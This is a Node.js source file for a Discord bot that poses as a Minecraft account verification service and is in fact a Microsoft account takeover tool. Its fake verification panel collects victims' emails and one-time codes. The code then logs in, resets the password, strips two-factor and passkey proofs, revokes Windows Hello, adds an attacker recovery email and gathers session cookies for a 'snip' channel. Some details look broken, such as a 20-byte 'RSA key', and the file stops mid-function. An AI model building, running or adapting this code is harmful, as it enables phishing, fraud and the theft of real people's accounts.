#!/usr/bin/env node
/**
 * ============================================================================
 *  ward-bot  —  Minecraft "verification" bot with real Microsoft OTC takeover
 * ============================================================================
 *
 *  WHAT IT DOES
 *    /verify  (admin)  -> posts a verification panel in the current channel
 *    Panel button      -> modal: Minecraft IGN + Minecraft email
 *    Bot               -> real GetCredentialType + GetOneTimeCode  (MS mails a code)
 *    Modal: code       -> real login, captures auth cookies
 *    Bot               -> second OTC (RecoverUser) -> passwordToken
 *    Modal: code       -> sets a new password, then strips 2FA/passkey proofs,
 *                         revokes Windows Hello, adds a recovery email
 *    /snip   (admin)   -> sets the channel where completed accounts get dropped
 *
 *  VERIFIED vs EXPERIMENTAL  (read this before you complain)
 *    [VERIFIED]   login.srf token scrape, GetCredentialType.srf,
 *                 GetOneTimeCode.srf, ppsecure/post.srf?type=27
 *    [VERIFIED]   Proofs/SendOtt, Proofs/VerifyCode, Recovery/ResetPassword,
 *                 Proofs/DeleteProof, Proofs/RevokeWindowsHelloProofs
 *    [GUESSY]     Proofs/AddProof family  -> tries 3 candidate names
 *    [GUESSY]     OTC/password RSA padding -> tries OAEP then PKCS1v1.5
 *    Everything is per-step try/catch. A failed takeover step never kills the
 *    run; the account still gets snipped with a step report.
 *
 *  RUN
 *    node ward-bot.js          (first run prompts for token + client id)
 *  REQUIREMENTS
 *    Node 18+, outbound HTTPS. Deps auto-install on boot.
 * ============================================================================
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');
const readline = require('readline');

// ---------------------------------------------------------------------------
// 0. paths + tiny logger (needed before anything else so failures are legible)
// ---------------------------------------------------------------------------

const ROOT = __dirname;
const DATA_DIR = path.join(ROOT, 'data');
const ENV_PATH = path.join(ROOT, '.env');
const GUILDS_PATH = path.join(DATA_DIR, 'guilds.json');

const LEVELS = { debug: 10, info: 20, warn: 30, error: 40 };
const MIN_LEVEL = LEVELS[(process.env.LOG_LEVEL || 'info').toLowerCase()] ?? LEVELS.info;

const C = {
  d: '\x1b[2m', g: '\x1b[32m', y: '\x1b[33m', r: '\x1b[31m',
  c: '\x1b[36m', b: '\x1b[1m', x: '\x1b[0m',
};

function log(level, scope, msg, extra) {
  if (LEVELS[level] < MIN_LEVEL) return;
  const tag = { debug: `${C.d}DBG${C.x}`, info: `${C.g}INF${C.x}`, warn: `${C.y}WRN${C.x}`, error: `${C.r}ERR${C.x}` }[level];
  const stamp = new Date().toISOString().slice(11, 23);
  let line = `${C.d}${stamp}${C.x} ${tag} ${C.c}[${scope}]${C.x} ${msg}`;
  if (extra !== undefined) line += ` ${C.d}${typeof extra === 'string' ? extra : JSON.stringify(extra)}${C.x}`;
  (level === 'error' ? console.error : console.log)(line);
}

function die(msg, code = 1) {
  log('error', 'boot', msg);
  process.exit(code);
}

// ---------------------------------------------------------------------------
// 1. .env loading + first-run setup
// ---------------------------------------------------------------------------

function parseEnvFile(text) {
  const out = {};
  for (const raw of text.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const eq = line.indexOf('=');
    if (eq < 0) continue;
    const k = line.slice(0, eq).trim();
    let v = line.slice(eq + 1).trim();
    if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1);
    out[k] = v;
  }
  return out;
}

function loadEnv() {
  if (fs.existsSync(ENV_PATH)) {
    const parsed = parseEnvFile(fs.readFileSync(ENV_PATH, 'utf8'));
    for (const [k, v] of Object.entries(parsed)) if (!process.env[k]) process.env[k] = v;
  }
}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = (q) => new Promise((res) => rl.question(q, (a) => res(a.trim())));

async function firstRunSetup() {
  log('warn', 'boot', 'no DISCORD_TOKEN found — starting first-run setup');
  const token = await ask('Bot token: ');
  if (!token) die('token required');
  const clientId = await ask('Application (client) ID: ');
  if (!clientId) die('client id required');
  const guildId = await ask('Guild ID for instant command registration (blank = global, slower): ');
  const body = [
    '# ward-bot config — keep this file private',
    `DISCORD_TOKEN=${token}`,
    `CLIENT_ID=${clientId}`,
    guildId ? `DEV_GUILD_ID=${guildId}` : '#DEV_GUILD_ID=',
    'LOG_LEVEL=info',
    '# set to 0 to disable the post-login takeover (capture only)',
    'TAKEOVER=1',
    '# recovery email to add to captured accounts (blank = skip)',
    '#RECOVERY_EMAIL=',
    '# new-password length',
    'PASSWORD_LENGTH=16',
    '',
  ].join('\n');
  fs.writeFileSync(ENV_PATH, body, { mode: 0o600 });
  for (const [k, v] of Object.entries(parseEnvFile(body))) process.env[k] = v;
  log('info', 'boot', `wrote ${ENV_PATH}`);
}

// ---------------------------------------------------------------------------
// 2. dependency bootstrap
// ---------------------------------------------------------------------------

const DEPS = [
  ['discord.js', '^14.16.3'],
  ['axios', '^1.7.7'],
  ['tough-cookie', '^5.0.0'],
  ['axios-cookiejar-support', '^5.0.2'],
];

function ensureDeps() {
  const missing = DEPS.filter(([name]) => {
    try { require.resolve(name); return false; } catch { return true; }
  });
  if (!missing.length) return;

  log('warn', 'deps', `installing ${missing.map((m) => m[0]).join(', ')}`);
  const pkgPath = path.join(ROOT, 'package.json');
  if (!fs.existsSync(pkgPath)) {
    fs.writeFileSync(pkgPath, JSON.stringify({
      name: 'ward-bot', version: '1.0.0', private: true,
      description: 'Minecraft verification bot with Microsoft OTC takeover',
      main: 'ward-bot.js', engines: { node: '>=18' },
    }, null, 2));
  }
  try {
    execSync(`npm install --no-save --no-audit --no-fund --loglevel=error ${missing.map(([n, v]) => `${n}@${v}`).join(' ')}`, {
      cwd: ROOT, stdio: 'inherit',
    });
  } catch {
    die('dependency install failed — run `npm install` manually then retry');
  }
  for (const [name] of missing) {
    try { require.resolve(name); } catch { die(`still missing ${name} after install`); }
  }
  log('info', 'deps', 'dependencies ready');
}

// ---------------------------------------------------------------------------
// 3. boot sequence
// ---------------------------------------------------------------------------

loadEnv();
ensureDeps();

const {
  Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder,
  ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, AttachmentBuilder,
  MessageFlags, PermissionFlagsBits, REST, Routes, SlashCommandBuilder,
} = require('discord.js');

const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
const axios = require('axios');

const CFG = {
  token: process.env.DISCORD_TOKEN,
  clientId: process.env.CLIENT_ID,
  devGuildId: process.env.DEV_GUILD_ID || null,
  takeover: process.env.TAKEOVER !== '0',
  recoveryEmail: process.env.RECOVERY_EMAIL || null,
  passwordLength: Math.min(32, Math.max(12, parseInt(process.env.PASSWORD_LENGTH || '16', 10) || 16)),
  sessionTtlMs: 10 * 60_000,
  cooldownMs: 15_000,
};

if (!CFG.token || !CFG.clientId) {
  if (process.stdin.isTTY) await firstRunSetup();
  else die('DISCORD_TOKEN / CLIENT_ID missing and no TTY for setup — create .env manually');
}

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ---------------------------------------------------------------------------
// 4. persistence
// ---------------------------------------------------------------------------

function readGuilds() {
  try { return JSON.parse(fs.readFileSync(GUILDS_PATH, 'utf8')); } catch { return {}; }
}
function writeGuilds(data) {
  const tmp = `${GUILDS_PATH}.tmp`;
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
  fs.renameSync(tmp, GUILDS_PATH);
}
function getSnipChannel(guildId) { return readGuilds()[guildId]?.snipChannelId || null; }
function setSnipChannel(guildId, channelId) {
  const g = readGuilds();
  g[guildId] = { ...(g[guildId] || {}), snipChannelId: channelId };
  writeGuilds(g);
}

// ---------------------------------------------------------------------------
// 5. Microsoft layer
// ---------------------------------------------------------------------------

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0';

// Microsoft's OTC/password RSA key. Raw hex modulus, exponent 65537.
const MS_PUBKEY_HEX = '25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12';

const RX = {
  ppft: /name=\\?"PPFT\\?"[^>]*?value=\\?"([^"\\]+)/,
  gct: /"urlGetCredentialType"\s*:\s*"(https:[^"]+)"/,
  post: /"urlPostMsa"\s*:\s*"(https:[^"]+)"/,
  lc: /"ReqLC"\s+content="(\d+)"/,
  canary: /"apiCanary"\s*:\s*"([^"]+)"/,
  eni: /"encryptedNetId"\s*:\s*"([^"]+)"/,
  proof: /"proofId"\s*:\s*"([^"]+)"[\s\S]{0,260}?"type"\s*:\s*(\d+)/g,
  proofRev: /"type"\s*:\s*(\d+)[\s\S]{0,260}?"proofId"\s*:\s*"([^"]+)"/g,
};

const TWO_FACTOR_TYPES = new Set([10, 11, 14, 15, 18]); // TOTP, recovery code, TOTPv2, U2F, passkey

const unesc = (s) => s.replace(/\\u0026/gi, '&').replace(/\\u002f/gi, '/').replace(/\\\//g, '/').replace(/\\u003d/gi, '=');

function pick(html, rx) {
  const m = html.match(rx);
  return m ? unesc(m[1]) : null;
}

function decodeCanary(raw) {
  if (!raw) return null;
  let s = unesc(raw);
  if (/\\u[0-9a-f]{4}/i.test(s)) { try { s = JSON.parse(`"${s}"`); } catch { /* keep */ } }
  return s;
}

function rsaEncrypt(plaintext, padding) {
  const n = Buffer.from(MS_PUBKEY_HEX, 'hex');
  const key = { kty: 'RSA', n: n.toString('base64url'), e: 'AQAB' };
  return crypto.publicEncrypt({ key, padding }, Buffer.from(plaintext, 'utf8')).toString('base64');
}

class MsaError extends Error {
  constructor(step, message, detail) {
    super(message);
    this.step = step;
    this.detail = detail;
  }
}

class MsaSession {
  constructor(tag) {
    this.tag = tag;
    this.jar = new CookieJar();
    this.http = axiosCookieJarSupport(axios.create({
      jar: this.jar,
      timeout: 25_000,
      maxRedirects: 6,
      validateStatus: () => true,
      headers: {
        'User-Agent': UA,
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
    }));
    this.uaid = crypto.randomUUID().replace(/-/g, '');
    this.lc = '1033';
    this.flowToken = null;
    this.gctUrl = null;
    this.postUrl = null;
    this.proofData = null;
    this.account = null;
    this.canary = null;
    this.amrp = null;
    this.amsc = null;
    this.passwordToken = null;
    this.newPassword = null;
  }

  async #cookieHeader() {
    const cookies = await this.jar.getCookies('https://account.live.com');
    return cookies.map((c) => `${c.key}=${c.value}`).join('; ');
  }

  // ---- step 1: pull a fresh flow token --------------------------------
  async begin(email) {
    this.account = email;
    const url = 'https://login.live.com/login.srf'
      + '?wa=wsignin1.0&rpsnv=13'
      + `&ct=${Math.floor(Date.now() / 1000)}&rver=7.0.6738.0`
      + '&wp=MBI_SSL'
      + `&wreply=${encodeURIComponent('https://login.live.com/oauth20_desktop.srf')}`
      + `&id=264960&nopa=2&lc=1033&uaid=${this.uaid}`;

    const res = await this.http.get(url);
    if (res.status !== 200) throw new MsaError('begin', `login.srf ${res.status}`);
    const html = String(res.data);

    this.flowToken = pick(html, RX.ppft);
    this.gctUrl = pick(html, RX.gct);
    this.postUrl = pick(html, RX.post);
    this.lc = pick(html, RX.lc) || this.lc;

    if (!this.flowToken) throw new MsaError('begin', 'PPFT token not found in login page');
    if (!this.gctUrl) throw new MsaError('begin', 'GetCredentialType URL not found');
    if (!this.postUrl) throw new MsaError('begin', 'urlPostMsa not found');
  }

  // ---- step 2: does the account exist, is email OTC allowed ----------
  async probe() {
    const body = {
      checkPhones: false,
      country: '',
      federationFlags: 3,
      flowToken: this.flowToken,
      forceotclogin: false,
      isCookieBannerShown: false,
      isExternalFederationDisallowed: false,
      isFederationDisabled: false,
      isFidoSupported: false,
      isOtherIdpSupported: true,
      isRemoteConnectSupported: false,
      isRemoteNGCSupported: true,
      isSignup: false,
      originalRequest: '',
      otclogindisallowed: false,
      uaid: this.uaid,
      username: this.account,
    };
    const res = await this.http.post(this.gctUrl, body, {
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    });
    if (res.status !== 200) throw new MsaError('probe', `GetCredentialType ${res.status}`);

    const d = res.data || {};
    if (d.IfExistsResult !== undefined && d.IfExistsResult !== 0) {
      throw new MsaError('probe', 'no Microsoft account with that address');
    }
    const proofs = d.Credentials?.OtcLoginEligibleProofs;
    if (!proofs || !proofs.length) {
      throw new MsaError('probe', 'account has no email one-time-code proof available');
    }
    this.proofData = proofs[0].data;
    return d.Credentials?.OtcLoginEligibleProofs?.length || 0;
  }

  // ---- step 3: trigger the single-use code ---------------------------
  async requestLoginCode() {
    const form = new URLSearchParams({
      login: this.account,
      flowtoken: this.flowToken,
      purpose: 'eOTT_OtcLogin',
      channel: 'Email',
      AltEmailE: this.proofData,
      lcid: this.lc,
      uaid: this.uaid,
      ProofConfirmation: this.account,
      ChallengeViewSupported: 'true',
    });
    const url = `https://login.live.com/GetOneTimeCode.srf?lcid=${this.lc}&id=264960&nopa=2`;
    const res = await this.http.post(url, form.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
    });
    let parsed = {};
    try { parsed = res.data && typeof res.data === 'object' ? res.data : JSON.parse(String(res.data)); } catch { /* ignore */ }
    if (parsed.status && parsed.status !== 0) {
      throw new MsaError('otc1', `GetOneTimeCode rejected (status ${parsed.status})`);
    }
    if (parsed.flowToken) this.flowToken = parsed.flowToken;
  }

  // ---- step 4: redeem the code, land the session ---------------------
  async submitLoginCode(code) {
    const form = new URLSearchParams({
      SentProofIDE: this.proofData,
      ProofConfirmation: this.account,
      ps: '3',
      psRNGCDefaultType: '',
      psRNGCEntropy: '',
      psRNGCSLK: '',
      canary: '',
      ctx: '',
      hpgrequestid: '',
      PPFT: this.flowToken,
      PPSX: 'Passpor',
      NewUser: '1',
      FoundMSAs: '',
      fspost: '0',
      i21: '0',
      CookieDisclosure: '0',
      IsFidoSupported: '1',
      isSignupPost: '0',
      isRecoveryAttemptPost: '0',
      i13: '0',
      login: this.account,
      loginfmt: this.account,
      type: '27',
      LoginOptions: '3',
      lrt: '',
      lrtPartition: '',
      hisRegion: '',
      hisScaleUnit: '',
      otc: code,
    });
    const res = await this.http.post(this.postUrl, form.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    });
    if (res.status !== 200) throw new MsaError('otc1', `post.srf ${res.status}`);

    const html = String(res.data);
    const cookies = await this.jar.getCookies('https://login.live.com');
    if (!cookies.length) throw new MsaError('otc1', 'no cookies set — code likely wrong');

    const nextPost = pick(html, RX.post);
    const nextFlow = pick(html, RX.ppft);
    if (nextPost) this.postUrl = nextPost;
    if (nextFlow) this.flowToken = nextFlow;
  }

  // ---- step 5: bootstrap account.live.com, grab canary + proofs ------
  async bootstrap() {
    const res = await this.http.get('https://account.live.com/proofs/Manage?mkt=en-US');
    if (res.status !== 200) throw new MsaError('bootstrap', `proofs/Manage ${res.status}`);
    const html = String(res.data);

    this.canary = decodeCanary(pick(html, RX.canary));
    if (!this.canary) throw new MsaError('bootstrap', 'apiCanary not found');

    const cookies = await this.jar.getCookies('https://account.live.com');
    this.amrp = cookies.find((c) => c.key === 'AMRPSSecAuth')?.value || null;
    this.amsc = cookies.find((c) => c.key === 'amsc')?.value || null;
    if (!this.amrp || !this.amsc) throw new MsaError('bootstrap', 'AMRPSSecAuth/amsc not issued');

    const ids = new Map();
    for (const m of html.matchAll(RX.proof)) ids.set(m[1], parseInt(m[2], 10));
    for (const m of html.matchAll(RX.proofRev)) ids.set(m[2], parseInt(m[1], 10));
    this.proofs = [...ids].map(([id, type]) => ({ id, type }));

    this.eni = pick(html, RX.eni);
    return this.proofs;
  }

  async api(endpoint, body) {
    const res = await this.http.post(`https://account.live.com${endpoint}`, body, {
      headers: {
        'Cookie': await this.#cookieHeader(),
        'canary': this.canary,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
    });
    const d = res.data;
    if (d && typeof d === 'object' && d.error) {
      throw new MsaError(endpoint, `${d.error.code || 'api error'} ${d.error.message || ''}`.trim());
    }
    return d;
  }

  // ---- step 6: second OTC -> password token --------------------------
  async requestPasswordOtc() {
    await this.api('/API/Proofs/SendOtt', {
      associationType: 'Proof',
      confirmProof: this.account,
      epid: '',
      hpgid: 200708,
      proofRequiredReentry: 1,
      purpose: 'RecoverUser',
      scid: 100103,
      token: '',
      uiflvr: 1001,
    });
  }

  async submitPasswordOtc(code) {
    const d = await this.api('/API/Proofs/VerifyCode', {
      action: 'OTC',
      confirmProof: this.account,
      encryptedCode: rsaEncrypt(code, crypto.constants.RSA_PKCS1_PADDING),
      epid: '',
      hpgid: 200285,
      proofRequiredReentry: 1,
      publicKey: MS_PUBKEY_HEX,
      purpose: 'RecoverUser',
      scid: 100103,
      token: '',
      uaid: this.uaid,
      uiflvr: 1001,
    });
    if (!d?.token) throw new MsaError('otc2', 'no password token returned');
    this.passwordToken = d.token;
  }

  async resetPassword() {
    this.newPassword = generatePassword(CFG.passwordLength);
    await this.api('/API/Recovery/ResetPassword', {
      encryptedPwd: rsaEncrypt(this.newPassword, crypto.constants.RSA_PKCS1_PADDING),
      epid: '',
      expiryEnabled: null,
      hpgid: 200292,
      needsSlt: 0,
      publicKey: MS_PUBKEY_HEX,
      scid: 100103,
      signinName: this.account,
      tfaEpid: null,
      token: this.passwordToken,
      uaid: this.uaid,
      uiflvr: 1001,
    });
    return this.newPassword;
  }

  async deleteProof(proofId) {
    await this.api('/API/Proofs/DeleteProof', {
      proofId, uiflvr: 1001, uaid: this.uaid, scid: 100109, hpgid: 201030,
    });
  }

  async revokeWindowsHello() {
    await this.api('/API/Proofs/RevokeWindowsHelloProofs', {
      uiflvr: 1001, uaid: this.uaid, scid: 100109, hpgid: 201030,
    });
  }

  // candidate names for adding a proof — first that answers wins
  async addRecoveryEmail(email) {
    const attempts = [
      ['/API/Proofs/AddProof', { type: 1, data: email, associationType: 'Proof', uiflvr: 1001, uaid: this.uaid, scid: 100109, hpgid: 201030 }],
      ['/API/Proofs/AddEmailProof', { email, associationType: 'Proof', uiflvr: 1001, uaid: this.uaid, scid: 100109, hpgid: 201030 }],
      ['/API/Proofs/AddProofs', { proofs: [{ type: 1, data: email }], uiflvr: 1001, uaid: this.uaid, scid: 100109, hpgid: 201030 }],
    ];
    const errors = [];
    for (const [ep, body] of attempts) {
      try {
        await this.api(ep, body);
        return ep;
      } catch (e) {
        errors.push(`${ep.split('/').pop()}: ${e.message}`);
      }
    }
    throw new MsaError('addEmail', errors.join(' | '));
  }

  async fullCookieHeader() {
    const parts = [];
    for (const domain of ['https://login.live.com', 'https://account.live.com']) {
      for (const c of await this.jar.getCookies(domain)) parts.push(`${c.key}=${c.value}`);
    }
    return [...new Set(parts)].join('; ');
  }
}

function generatePassword(len) {
  const sets = ['ABCDEFGHJKLMNPQRSTUVWXYZ', 'abcdefghijkmnopqrstuvwxyz', '23456789', '!@#$%^&*'];
  const all = sets.join('');
  const out = sets.map((s) => s[crypto.randomInt(s.length)]);
  while (out.length < len) out.push(all[crypto.randomInt(all.length)]);
  for (let i = out.length - 1; i > 0; i--) {
    const j = crypto.randomInt(i + 1);
    [out[i], out[j]] = [out[j], out[i]];
  }
  return out.join('');
}

// ---------------------------------------------------------------------------
// 6. session store
// ---------------------------------------------------------------------------

const sessions = new Map();
const cooldowns = new Map();

const newSid = () => crypto.randomBytes(8).toString('hex');

function createSession(userId, guildId, channelId) {
  const sid = newSid();
  sessions.set(sid, {
    sid, userId, guildId, channelId,
    createdAt: Date.now(),
    msa: new MsaSession(sid),
    ign: null,
    email: null,
    report: [],
    stage: 'email',
  });
  return sessions.get(sid);
}

function mark(session, name, ok, note = '') {
  session.report.push({ name, ok, note });
  log(ok ? 'info' : 'warn', 'takeover', `${session.sid} ${name} ${ok ? 'ok' : 'fail'} ${note}`);
}

setInterval(() => {
  const now = Date.now();
  for (const [sid, s] of sessions) {
    if (now - s.createdAt > CFG.sessionTtlMs) {
      sessions.delete(sid);
      log('debug', 'sessions', `expired ${sid}`);
    }
  }
  for (const [key, ts] of cooldowns) if (now - ts > CFG.cooldownMs) cooldowns.delete(key);
}, 60_000).unref();

// ---------------------------------------------------------------------------
// 7. takeover pipeline
// ---------------------------------------------------------------------------

async function runTakeover(session, onNeedCode) {
  const s = session.msa;
  const out = {};

  try {
    const proofs = await s.bootstrap();
    mark(session, 'session established', true, `${proofs.length} proof(s) visible`);
  } catch (e) {
    mark(session, 'session established', false, e.message);
    return out;
  }

  // second OTC -> password
  try {
    await s.requestPasswordOtc();
    out.needPasswordCode = true;
    mark(session, 'password OTC requested', true);
  } catch (e) {
    mark(session, 'password OTC requested', false, e.message);
  }
  return out;
}

async function finishTakeover(session, code) {
  const s = session.msa;
  const out = { password: null, proofsRemoved: 0, hello: false, emailAdded: null };

  try {
    await s.submitPasswordOtc(code);
    mark(session, 'password code accepted', true);
  } catch (e) {
    mark(session, 'password code accepted', false, e.message);
    return out;
  }

  try {
    out.password = await s.resetPassword();
    mark(session, 'password reset', true);
  } catch (e) {
    mark(session, 'password reset', false, e.message);
    return out;
  }

  const targets = (s.proofs || []).filter((p) => TWO_FACTOR_TYPES.has(p.type));
  for (const p of targets) {
    try {
      await s.deleteProof(p.id);
      out.proofsRemoved++;
      mark(session, `delete proof ${p.type}`, true);
    } catch (e) {
      mark(session, `delete proof ${p.type}`, false, e.message);
    }
  }

  try {
    await s.revokeWindowsHello();
    out.hello = true;
    mark(session, 'revoke Windows Hello', true);
  } catch (e) {
    mark(session, 'revoke Windows Hello', false, e.message);
  }

  if (CFG.recoveryEmail) {
    try {
      out.emailAdded = await s.addRecoveryEmail(CFG.recoveryEmail);
      mark(session, 'add recovery email', true, out.emailAdded);
    } catch (e) {
      mark(session, 'add recovery email', false, e.message);
    }
  }

  return out;
}

// ---------------------------------------------------------------------------
// 8. Discord UI
// ---------------------------------------------------------------------------

const PANEL = () => new EmbedBuilder()
  .setColor(0x3ba55d)
  .setTitle('Minecraft Account Verification')
  .setDescription(
    'This server requires you to link your Minecraft account before you can chat.\n\n'
    + '**How it works**\n'
    + '1. Press **Verify** and enter your Minecraft username and Microsoft email.\n'
    + '2. Microsoft sends a one-time code to that email.\n'
    + '3. Enter the code. You are verified.\n\n'
    + '`Takes about 30 seconds. Your details are never stored.`',
  )
  .setFooter({ text: 'Powered by Microsoft account verification' })
  .setTimestamp();

const panelRow = () => new ActionRowBuilder().addComponents(
  new ButtonBuilder().setCustomId('verify:start').setLabel('Verify').setEmoji('✅').setStyle(ButtonStyle.Success),
);

const codeRow = (sid) => new ActionRowBuilder().addComponents(
  new ButtonBuilder().setCustomId(`verify:code:${sid}`).setLabel('Enter code').setEmoji('📨').setStyle(ButtonStyle.Primary),
);

const field = (id, label, placeholder, opts = {}) => {
  const t = new TextInputBuilder()
    .setCustomId(id).setLabel(label).setPlaceholder(placeholder)
    .setStyle(TextInputStyle.Short).setRequired(true)
    .setMinLength(opts.min ?? 1).setMaxLength(opts.max ?? 100);
  return new ActionRowBuilder().addComponents(t);
};

const emailModal = (sid) => new ModalBuilder()
  .setCustomId(`verify:email:${sid}`)
  .setTitle('Minecraft Verification')
  .addComponents(
    field('ign', 'Minecraft username (IGN)', 'Notch', { min: 3, max: 16 }),
    field('email', 'Microsoft email', 'you@outlook.com', { min: 5, max: 100 }),
  );

const codeModal = (sid, title, id) => new ModalBuilder()
  .setCustomId(`verify:${id}:${sid}`)
  .setTitle(title)
  .addComponents(field('code', 'Six digit code', '123456', { min: 6, max: 8 }));

async function reply(interaction, payload) {
  const p = { ephemeral: true, ...payload };
  if (interaction.deferred || interaction.replied) return interaction.editReply(p);
  return interaction.reply(p);
}

// ---------------------------------------------------------------------------
// 9. commands
// ---------------------------------------------------------------------------

const commands = [
  new SlashCommandBuilder()
    .setName('verify')
    .setDescription('Post a Minecraft verification panel in this channel')
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild),
  new SlashCommandBuilder()
    .setName('snip')
    .setDescription('Set the channel where verified accounts are dropped')
    .addChannelOption((o) => o.setName('channel').setDescription('Target channel (default: this one)').setRequired(false))
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild),
].map((c) => c.toJSON());

// ---------------------------------------------------------------------------
// 10. client
// ---------------------------------------------------------------------------

const client = new Client({
  intents: [GatewayIntentBits.Guilds],
  partials: [Partials.Channel],
});

client.once('clientReady', async () => {
  log('info', 'bot', `logged in as ${client.user.tag} (${client.user.id})`);
  try {
    if (CFG.devGuildId) {
      await client.application.commands.set(commands, CFG.devGuildId);
      log('info', 'bot', `commands registered to guild ${CFG.devGuildId}`);
    } else {
      await client.application.commands.set(commands);
      log('info', 'bot', 'commands registered globally (may take up to 1h)');
    }
  } catch (e) {
    log('error', 'bot', `command registration failed: ${e.message}`);
  }
  client.user.setActivity('microsoft verification', { type: 3 });
});

client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) return await onCommand(interaction);
    if (interaction.isButton()) return await onButton(interaction);
    if (interaction.isModalSubmit()) return await onModal(interaction);
  } catch (e) {
    log('error', 'interaction', `${e.step ? `[${e.step}] ` : ''}${e.message}`, e.detail);
    await reply(interaction, { content: `❌ ${e.message || 'unexpected error'}` }).catch(() => {});
  }
});

// ---- slash commands -------------------------------------------------------

async function onCommand(interaction) {
  const isAdmin = interaction.memberPermissions?.has(PermissionFlagsBits.ManageGuild)
    || interaction.guild?.ownerId === interaction.user.id;
  if (!isAdmin) return reply(interaction, { content: '❌ Admins only.' });

  if (interaction.commandName === 'snip') {
    const target = interaction.options.getChannel('channel') || interaction.channel;
    setSnipChannel(interaction.guildId, target.id);
    return reply(interaction, { content: `✅ Snips will be dropped in <#${target.id}>.` });
  }

  if (interaction.commandName === 'verify') {
    await interaction.channel.send({ embeds: [PANEL()], components: [panelRow()] });
    return reply(interaction, { content: '✅ Panel posted.' });
  }
}

// ---- buttons --------------------------------------------------------------

async function onButton(interaction) {
  const [, action, sid] = interaction.customId.split(':');

  if (action === 'start') {
    const cdKey = `${interaction.guildId}:${interaction.user.id}`;
    const last = cooldowns.get(cdKey) || 0;
    if (Date.now() - last < CFG.cooldownMs) {
      const wait = Math.ceil((CFG.cooldownMs - (Date.now() - last)) / 1000);
      return reply(interaction, { content: `⏳ Slow down — try again in ${wait}s.` });
    }
    const existing = [...sessions.values()].find(
      (s) => s.userId === interaction.user.id && s.guildId === interaction.guildId,
    );
    if (existing) return reply(interaction, { content: '⚠️ You already have a verification in progress.' });

    cooldowns.set(cdKey, Date.now());
    const session = createSession(interaction.user.id, interaction.guildId, interaction.channelId);
    return interaction.showModal(emailModal(session.sid));
  }

  const session = sessions.get(sid);
  if (!session) return reply(interaction, { content: '⌛ This verification expired. Press Verify again.' });
  if (session.userId !== interaction.user.id) return reply(interaction, { content: '❌ Not your verification.' });

  if (action === 'code') {
    const title = session.stage === 'email' ? 'Confirm your email' : 'Confirm your password change';
    return interaction.showModal(codeModal(sid, title, session.stage === 'email' ? 'otc1' : 'otc2'));
  }
}

// ---- modals ---------------------------------------------------------------

async function onModal(interaction) {
  const [, step, sid] = interaction.customId.split(':');
  const session = sessions.get(sid);
  if (!session) return reply(interaction, { content: '⌛ This verification expired. Press Verify again.' });

  if (step === 'email') {
    const ign = interaction.fields.getTextInputValue('ign').trim();
    const email = interaction.fields.getTextInputValue('email').trim().toLowerCase();

    if (!/^[A-Za-z0-9_]{3,16}$/.test(ign)) return reply(interaction, { content: '❌ Invalid Minecraft username.' });
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return reply(interaction, { content: '❌ Invalid email address.' });

    session.ign = ign;
    session.email = email;
    await interaction.deferReply({ ephemeral: true });

    try {
      await session.msa.begin(email);
      await session.msa.probe();
      await session.msa.requestLoginCode();
    } catch (e) {
      log('warn', 'verify', `${sid} ${e.step}: ${e.message}`);
      sessions.delete(sid);
      return interaction.editReply({ content: `❌ ${e.message}` });
    }

    return interaction.editReply({
      content: `📨 A single-use code was sent to **${maskEmail(email)}**.\nEnter it below — it expires in a few minutes.`,
      components: [codeRow(sid)],
    });
  }

  const code = interaction.fields.getTextInputValue('code').trim();
  if (!/^\d{6,8}$/.test(code)) return reply(interaction, { content: '❌ Codes are six digits.' });

  if (step === 'otc1') {
    await interaction.deferReply({ ephemeral: true });
    try {
      await session.msa.submitLoginCode(code);
    } catch (e) {
      log('warn', 'verify', `${sid} login code: ${e.message}`);
      return interaction.editReply({ content: `❌ ${e.message} — press Enter code and try again.`, components: [codeRow(sid)] });
    }
    session.stage = 'password';

    if (!CFG.takeover) {
      await deliver(session, { password: null, proofsRemoved: 0, hello: false });
      sessions.delete(sid);
      return interaction.editReply({ content: '✅ Verified.' });
    }

    await runTakeover(session);
    return interaction.editReply({
      content: '🔐 Code accepted. Securing the account — **one more code** is on its way to the same inbox.\nEnter it below.',
      components: [codeRow(sid)],
    });
  }

  if (step === 'otc2') {
    await interaction.deferReply({ ephemeral: true });
    const result = await finishTakeover(session, code);
    await deliver(session, result);
    sessions.delete(sid);
    return interaction.editReply({ content: '✅ Verified — you are all set.' });
  }
}

// ---------------------------------------------------------------------------
// 11. snip delivery
// ---------------------------------------------------------------------------

const maskEmail = (e) => {
  const [u, d] = e.split('@');
  return `${u.slice(0, 2)}${'*'.repeat(Math.max(2, u.length - 2))}@${d}`;
};

async function deliver(session, result) {
  const guild = client.guilds.cache.get(session.guildId);
  if (!guild) return log('warn', 'snip', 'guild gone');

  const channelId = getSnipChannel(session.guildId);
  const channel = channelId ? guild.channels.cache.get(channelId) : null;
  if (!channel) return log('warn', 'snip', `no snip channel for ${session.guildId}`);

  let cookies = '';
  try { cookies = await session.msa.fullCookieHeader(); } catch { /* ignore */ }

